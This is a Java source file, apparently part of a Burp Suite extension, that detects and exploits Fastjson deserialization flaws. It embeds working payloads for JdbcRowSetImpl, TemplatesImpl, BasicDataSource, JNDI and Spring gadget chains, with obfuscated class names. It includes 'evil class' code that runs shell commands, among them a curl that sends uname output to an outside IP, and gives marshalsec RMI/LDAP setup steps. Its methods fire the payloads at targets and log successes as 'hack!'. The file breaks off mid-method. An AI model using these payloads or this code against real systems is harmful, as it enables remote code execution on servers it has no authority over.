package burp.vuls;

import burp.*;
import burp.gadget.Gadget;
import burp.util.HttpRequestThread;
import burp.util.HttpResult;
import org.apache.commons.codec.binary.Base64;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;

public class FastJson {

    public static String dnslogCheck_poc = "##POC##\n" +
            "{\"rand1\":{\"@type\":\"java.net.InetAddress\",\"val\":\"http://dnslog\"}}\n" +
            "\n" +
            "{\"rand2\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"http://dnslog\"}}\n" +
            "\n" +
            "{\"rand3\":{\"@type\":\"java.net.Inet6Address\",\"val\":\"http://dnslog\"}}\n" +
            "\n" +
            "{\"rand4\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"http://dnslog\"}}}\n" +
            "\n" +
            "{\"rand5\":{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}}\n" +
            "\n" +
            "{\"rand6\":{\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"http://dnslog\"}}\"\"}}\n" +
            "\n" +
            "{\"rand7\":Set[{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}]}\n" +
            "\n" +
            "{\"rand8\":Set[{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}\n" +
            "\n" +
            "{\"rand9\":{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}:0";
    public static String JdbcRowSetImpl_0_poc = "##Condition##\n" +
            "version <= 1.2.24 + JDK1.8.0_102\n" +
            "\n" +
            "##Evil class##\n" +
            "public class Calc{\n" +
            "    public Calc(){\n" +
            "        try{\n" +
            "        \t// Runtime.getRuntime().exec(\"calc\");\n" +
            "            Runtime rt = Runtime.getRuntime();\n" +
            "            String[] commands = {\"bash\",\"-c\",\"curl http://172.17.237.185:8808/`uname`\"};\n" +
            "            Process pc = rt.exec(commands);\n" +
            "            pc.waitFor(); \n" +
            "        }catch (Exception e){\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "    public static void main(String[] argv){\n" +
            "        Calc c = new Calc();\n" +
            "    }\n" +
            "}\n" +
            "\n" +
            "##Step1##\n" +
            "start http service -> python -m http.server 8808\n" +
            "\n" +
            "##Step2##\n" +
            "marshalsec start rmi/ldap service, \n" +
            "  rmi: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
            "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
            "\n" +
            "##Step3##\n" +
            "#poc:\n" +
            "{\"handsome\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}\n" +
            "\n" +
            "{\"handsome\":{\"@type\":\"\\x63\\x6f\\x6d.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}\n" +
            "\n" +
            "{\"handsome\":{\"@type\":\"\\u0063\\u006f\\u006d.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}";
    public static String JdbcRowSetImpl_1_poc = "##Condition##\n" +
            "1.2.25 < version <= 1.2.41 + JDK1.8.0_102\n\n" +
            "##Evil class##\n" +
            "public class Calc{\n" +
            "    public Calc(){\n" +
            "        try{\n" +
            "        \t// Runtime.getRuntime().exec(\"calc\");\n" +
            "            Runtime rt = Runtime.getRuntime();\n" +
            "            String[] commands = {\"bash\",\"-c\",\"curl http://172.17.237.185:8808/`uname`\"};\n" +
            "            Process pc = rt.exec(commands);\n" +
            "            pc.waitFor(); \n" +
            "        }catch (Exception e){\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "    public static void main(String[] argv){\n" +
            "        Calc c = new Calc();\n" +
            "    }\n" +
            "}\n\n" +
            "##Step1##\n" +
            "start http service -> python -m http.server 8808\n\n" +
            "##Step2##\n" +
            "marshalsec start rmi/ldap service, \n" +
            "  rmi: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
            "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n\n" +
            "##Step3##\n" +
            "#poc:\n" +
            "{\"handsome\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}\n" +
            "\n" +
            "{\"handsome\":{\"@type\":\"L\\x63\\x6f\\x6d.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}\n" +
            "\n" +
            "{\"handsome\":{\"@type\":\"L\\u0063\\u006f\\u006d.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}";
    public static String JdbcRowSetImpl_2_poc = "##Condition##\n" +
            "version = 1.2.43 + JDK1.8.0_102\n\n" +
            "##Evil class##\n" +
            "public class Calc{\n" +
            "    public Calc(){\n" +
            "        try{\n" +
            "        \t// Runtime.getRuntime().exec(\"calc\");\n" +
            "            Runtime rt = Runtime.getRuntime();\n" +
            "            String[] commands = {\"bash\",\"-c\",\"curl http://172.17.237.185:8808/`uname`\"};\n" +
            "            Process pc = rt.exec(commands);\n" +
            "            pc.waitFor(); \n" +
            "        }catch (Exception e){\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "    public static void main(String[] argv){\n" +
            "        Calc c = new Calc();\n" +
            "    }\n" +
            "}\n\n" +
            "##Step1##\n" +
            "start http service -> python -m http.server 8808\n\n" +
            "##Step2##\n" +
            "marshalsec start rmi/ldap service, \n" +
            "  rmi: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
            "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n\n" +
            "##Step3##\n" +
            "#poc:\n" +
            "{\"handsome\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"rmi_addr\",\"autoCommit\":true]}}\n" +
            "\n" +
            "{\"handsome\":{\"@type\":\"[\\x63\\x6f\\x6d.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"rmi_addr\",\"autoCommit\":true]}}\n" +
            "\n" +
            "{\"handsome\":{\"@type\":\"[\\u0063\\u006f\\u006d.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"rmi_addr\",\"autoCommit\":true]}}";
    public static String JdbcRowSetImpl_3_poc = "##Condition##\n" +
            "version = 1.2.42 + JDK1.8.0_102\n\n" +
            "##Evil class##\n" +
            "public class Calc{\n" +
            "    public Calc(){\n" +
            "        try{\n" +
            "        \t// Runtime.getRuntime().exec(\"calc\");\n" +
            "            Runtime rt = Runtime.getRuntime();\n" +
            "            String[] commands = {\"bash\",\"-c\",\"curl http://172.17.237.185:8808/`uname`\"};\n" +
            "            Process pc = rt.exec(commands);\n" +
            "            pc.waitFor(); \n" +
            "        }catch (Exception e){\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "    public static void main(String[] argv){\n" +
            "        Calc c = new Calc();\n" +
            "    }\n" +
            "}\n\n" +
            "##Step1##\n" +
            "start http service -> python -m http.server 8808\n\n" +
            "##Step2##\n" +
            "marshalsec start rmi/ldap service, \n" +
            "  rmi: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
            "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n\n" +
            "##Step3##\n" +
            "#poc:\n" +
            "{\"handsome\":{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}\n" +
            "\n" +
            "{\"handsome\":{\"@type\":\"LL\\x63\\x6f\\x6d.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}\n" +
            "\n" +
            "{\"handsome\":{\"@type\":\"LL\\u0063\\u006f\\u006d.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}";
    public static String JdbcRowSetImpl_4_poc = "##Condition##\n" +
            "version = 1.2.47 + JDK1.8.0_102\n\n" +
            "##Evil class##\n" +
            "public class Calc{\n" +
            "    public Calc(){\n" +
            "        try{\n" +
            "        \t// Runtime.getRuntime().exec(\"calc\");\n" +
            "            Runtime rt = Runtime.getRuntime();\n" +
            "            String[] commands = {\"bash\",\"-c\",\"curl http://172.17.237.185:8808/`uname`\"};\n" +
            "            Process pc = rt.exec(commands);\n" +
            "            pc.waitFor(); \n" +
            "        }catch (Exception e){\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "    public static void main(String[] argv){\n" +
            "        Calc c = new Calc();\n" +
            "    }\n" +
            "}\n\n" +
            "##Step1##\n" +
            "start http service -> python -m http.server 8808\n\n" +
            "##Step2##\n" +
            "marshalsec start rmi/ldap service, \n" +
            "  rmi: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
            "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n\n" +
            "##Step3##\n" +
            "#poc:\n" +
            "{\"handsome\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}}\n" +
            "\n" +
            "{\"handsome\":{\"@type\":\"java.lang.Class\",\"val\":\"\\x63\\x6f\\x6d.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}}\n" +
            "\n" +
            "{\"handsome\":{\"@type\":\"java.lang.Class\",\"val\":\"\\u0063\\u006f\\u006d.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://xxx.com/aaa\",\"autoCommit\":true}}}";
    public static String TemplatesImpl_0_poc = "##Condition##\n" +
            "1.2.22 < version <= 1.2.24 + JDK1.8.0_102/1.7\n\n" +
            "##Evil class##\n" +
            "import com.sun.org.apache.xalan.internal.xsltc.DOM;\n" +
            "import com.sun.org.apache.xalan.internal.xsltc.TransletException;\n" +
            "import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\n" +
            "import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\n" +
            "import com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n" +
            "\n" +
            "public class Exploit extends AbstractTranslet {\n" +
            "    public Exploit() {\n" +
            "        try {\n" +
            "            String var1 = \"ifconfig\";\n" +
            "            String[] var2 = System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd\", \"/c\", var1} : new String[]{\"/bin/bash\", \"-c\", var1};\n" +
            "            Process var3 = Runtime.getRuntime().exec(var2);\n" +
            "            var3.waitFor();\n" +
            "        } catch (Exception var5) {\n" +
            "            var5.printStackTrace();\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {\n" +
            "    }\n" +
            "\n" +
            "    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n" +
            "    }\n" +
            "\n" +
            "    public static void main(String[] args) throws Exception {\n" +
            "        new Exploit();\n" +
            "    }\n" +
            "}\n\n" +
            "##Step1##\n make evil class\n" +
            "    javac Exploit.java\n\n" +
            "##Step2##\n make evil class to byte\n" +
            "    public static String readClass(String clsFile){\n" +
            "        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n" +
            "        try {\n" +
            "            IOUtils.copy(new FileInputStream(new File(clsFile)), bos);\n" +
            "        } catch (IOException e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "        return Base64.encodeBase64String(bos.toByteArray()); //Base64 form commons.codec\n" +
            "    }\n\n" +
            "#Poc:\n" +
            "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n" +
            "\n" +
            "{\"@type\":\"\\x63\\x6f\\x6d.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n" +
            "\n" +
            "{\"@type\":\"\\u0063\\u006f\\u006d.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}";
    public static String TemplatesImpl_1_poc = "##Condition##\n" +
            "1.2.22 < version <= 1.2.24 + JDK1.8.0_102/1.7\n\n" +
            "##Evil class##\n" +
            "import org.apache.xalan.xsltc.DOM;\n" +
            "import org.apache.xalan.xsltc.TransletException;\n" +
            "import org.apache.xalan.xsltc.runtime.AbstractTranslet;\n" +
            "import org.apache.xml.dtm.DTMAxisIterator;\n" +
            "import org.apache.xml.serializer.SerializationHandler;\n" +
            "\n" +
            "public class Exploit extends AbstractTranslet {\n" +
            "    public Exploit() {\n" +
            "        try {\n" +
            "            String var1 = \"ifconfig\";\n" +
            "            String[] var2 = System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd\", \"/c\", var1} : new String[]{\"/bin/bash\", \"-c\", var1};\n" +
            "            Process var3 = Runtime.getRuntime().exec(var2);\n" +
            "            var3.waitFor();\n" +
            "        } catch (Exception var5) {\n" +
            "            var5.printStackTrace();\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {\n" +
            "    }\n" +
            "\n" +
            "    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n" +
            "    }\n" +
            "\n" +
            "    public static void main(String[] args) throws Exception {\n" +
            "        new Exploit();\n" +
            "    }\n" +
            "}\n\n" +
            "##Step1##\n make evil class\n" +
            "    javac Exploit.java\n\n" +
            "##Step2##\n make evil class to byte\n" +
            "    public static String readClass(String clsFile){\n" +
            "        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n" +
            "        try {\n" +
            "            IOUtils.copy(new FileInputStream(new File(clsFile)), bos);\n" +
            "        } catch (IOException e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "        return Base64.encodeBase64String(bos.toByteArray()); //Base64 form commons.codec\n" +
            "    }\n\n" +
            "#Poc:\n" +
            "{\"@type\":\"org.apache.xalan.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n" +
            "\n"+
            "{\"@type\":\"\\u006f\\u0072\\u0067.apache.xalan.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n" +
            "\n" +
            "{\"@type\":\"\\x6f\\x72\\x67.apache.xalan.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}";
    public static String BasicDataSource_0_poc = "##Condition##\n" +
            "1.2.22 < version <= 1.2.24 + JDK1.8.0_102/1.7\n\n" +
            "##Evil class##\n" +
            "public class Exploit {\n" +
            "    public Exploit() {\n" +
            "    }\n" +
            "\n" +
            "    static {\n" +
            "        try {\n" +
            "            String var0 = \"ifconfig\";\n" +
            "            String[] var1 = System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd\", \"/c\", var0} : new String[]{\"/bin/bash\", \"-c\", var0};\n" +
            "            Process var2 = Runtime.getRuntime().exec(var1);\n" +
            "            var2.waitFor();\n" +
            "        } catch (Exception var4) {\n" +
            "            var4.printStackTrace();\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "}\n\n" +
            "##Step1##\n make evil class\n" +
            "    javac Exploit.java\n\n" +
            "##Step2##\n make evil class to byte\n" +
            "    public static String readClass(String clsFile){\n" +
            "        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n" +
            "        try {\n" +
            "            IOUtils.copy(new FileInputStream(new File(clsFile)), bos);\n" +
            "        } catch (IOException e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "        return Base64.encodeBase64String(bos.toByteArray()); //Base64 form commons.codec\n" +
            "    }\n\n" +
            "#Poc:\n" +
            "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n" +
            "\n"+
            "{\"@type\":\"\\x63\\x6f\\x6d.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n" +
            "\n" +
            "{\"@type\":\"\\u0063\\u006f\\u006d.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}";
    public static String BasicDataSource_1_poc = "##Condition##\n" +
            "1.2.22 < version <= 1.2.24 + JDK1.8.0_102/1.7\n\n" +
            "##Evil class##\n" +
            "public class Exploit {\n" +
            "    public Exploit() {\n" +
            "    }\n" +
            "\n" +
            "    static {\n" +
            "        try {\n" +
            "            String var0 = \"ifconfig\";\n" +
            "            String[] var1 = System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd\", \"/c\", var0} : new String[]{\"/bin/bash\", \"-c\", var0};\n" +
            "            Process var2 = Runtime.getRuntime().exec(var1);\n" +
            "            var2.waitFor();\n" +
            "        } catch (Exception var4) {\n" +
            "            var4.printStackTrace();\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "}\n\n" +
            "##Step1##\n make evil class\n" +
            "    javac Exploit.java\n\n" +
            "##Step2##\n make evil class to byte\n" +
            "    public static String readClass(String clsFile){\n" +
            "        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n" +
            "        try {\n" +
            "            IOUtils.copy(new FileInputStream(new File(clsFile)), bos);\n" +
            "        } catch (IOException e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "        return Base64.encodeBase64String(bos.toByteArray()); //Base64 form commons.codec\n" +
            "    }\n\n" +
            "#Poc:\n" +
            "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"###EVIL_CODE###\"}}:\"ddd\"}\n" +
            "\n"+
            "{{\"@type\":\"\\x63\\x6f\\x6d.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"###EVIL_CODE###\"}}:\"ddd\"}\n" +
            "\n" +
            "{{\"@type\":\"\\u0063\\u006f\\u006d.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"###EVIL_CODE###\"}}:\"ddd\"}";
    public static String JndiDataSourceFactory_poc = "##Condition##\n" +
            "version = 1.2.47 + JDK1.8.0_102\n\n" +
            "##Evil class##\n" +
            "public class Calc{\n" +
            "    public Calc(){\n" +
            "        try{\n" +
            "        \t// Runtime.getRuntime().exec(\"calc\");\n" +
            "            Runtime rt = Runtime.getRuntime();\n" +
            "            String[] commands = {\"bash\",\"-c\",\"curl http://172.17.237.185:8808/`uname`\"};\n" +
            "            Process pc = rt.exec(commands);\n" +
            "            pc.waitFor(); \n" +
            "        }catch (Exception e){\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "    public static void main(String[] argv){\n" +
            "        Calc c = new Calc();\n" +
            "    }\n" +
            "}\n\n" +
            "##Step1##\n" +
            "start http service -> python -m http.server 8808\n\n" +
            "##Step2##\n" +
            "marshalsec start rmi/ldap service, \n" +
            "  rmi: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
            "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n\n" +
            "##Step3##\n" +
            "#poc:\n" +
            "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://xxx.com\"/name\"}}\n" +
            "\n"+
            "{\"@type\":\"\\u006f\\u0072\\u0067.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://xxx.com\"/name\"}}\n" +
            "\n"+
            "{\"@type\":\"\\x6f\\x72\\x67.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://xxx.com\"/name\"}}\n";
    public static String SimpleJndiBeanFactory_poc = "##Condition##\n" +
            "version = 1.2.47 + JDK1.8.0_102\n\n" +
            "##Evil class##\n" +
            "public class Calc{\n" +
            "    public Calc(){\n" +
            "        try{\n" +
            "        \t// Runtime.getRuntime().exec(\"calc\");\n" +
            "            Runtime rt = Runtime.getRuntime();\n" +
            "            String[] commands = {\"bash\",\"-c\",\"curl http://172.17.237.185:8808/`uname`\"};\n" +
            "            Process pc = rt.exec(commands);\n" +
            "            pc.waitFor(); \n" +
            "        }catch (Exception e){\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "    public static void main(String[] argv){\n" +
            "        Calc c = new Calc();\n" +
            "    }\n" +
            "}\n\n" +
            "##Step1##\n" +
            "start http service -> python -m http.server 8808\n\n" +
            "##Step2##\n" +
            "marshalsec start rmi/ldap service, \n" +
            "  rmi: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://httpserver-ip:8808/#Calc\"\n" +
            "  ladp: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://httpserver-ip:8808/#Calc\"\n\n" +
            "##Step3##\n" +
            "#poc:\n" +
            "{\"handsome\": Set [{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",\"beanFactory\":{\"@type\":\"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\":[\"rmi://XXX.COM/name\"]},\"adviceBeanName\":\"rmi://XX.COM/name\"},{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",}]}\n" +
            "\n" +
            "{\"handsome\": Set [{\"@type\":\"\\u006f\\u0072\\u0067.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",\"beanFactory\":{\"@type\":\"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\":[\"rmi://XXX.COM/name\"]},\"adviceBeanName\":\"rmi://XX.COM/name\"},{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",}]}\n" +
            "\n" +
            "{\"handsome\": Set [{\"@type\":\"\\x6f\\x72\\x67.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",\"beanFactory\":{\"@type\":\"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\":[\"rmi://XXX.COM/name\"]},\"adviceBeanName\":\"rmi://XX.COM/name\"},{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",}]};";


    public static void dnslogCheck() {
        String poc = dnslogCheck_poc;
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        List<String> payloads = new ArrayList<String>();
        payloads.add("{\"rand1\":{\"@type\":\"java.net.InetAddress\",\"val\":\"http://" + val +"\"}}");
        payloads.add("{\"rand1\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"http://" + val +"\"}}");
        payloads.add("{\"rand1\":{\"@type\":\"java.net.Inet6Address\",\"val\":\"http://" + val +"\"}}");
        payloads.add("{\"rand1\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"http://" + val +"\"}}}");
        payloads.add("{\"rand1\":{\"@type\":\"java.net.URL\"{\"address\":,\"val\":\"http://" + val +"\"}}}");

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        for (String payload:
             payloads) {
            HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            try {
                // 等待，直到运行结束
                thread.join();
            } catch (InterruptedException e) {
                OutputStream out = BurpExtender.callbacks.getStderr();
                PrintWriter p = new PrintWriter(out);
                e.printStackTrace(p);
                try {
                    p.flush();
                    out.flush();
                } catch (IOException ioException) {
                    ioException.printStackTrace();
                }
            }
            HttpResult httpResult = httpRequestThread.getResulemessageInfo();
            if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
                BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "dnslogCheck", poc, "hack!"));
            } else {
                BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "dnslogCheck", poc, "pass"));
            }
        }
    }

    public static void JdbcRowSetImpl_0() {
        String poc = JdbcRowSetImpl_0_poc;
        // 1.2.24 + JDK1.8.0_102
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String payload = "{\"handsome\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://" + val +"/name\",\"autoCommit\":true}}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        Thread thread = new Thread(httpRequestThread);
        thread.start();
        try {
            // 等待，直到运行结束
            thread.join();
        } catch (InterruptedException e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_0", poc, "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_0", poc, "pass"));
        }
    }

    public static void JdbcRowSetImpl_1() {
        String poc = JdbcRowSetImpl_1_poc;
        // 1.2.24 + JDK1.8.0_102
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String payload = "{\"handsome\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://" + val +"/name\",\"autoCommit\":true}}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
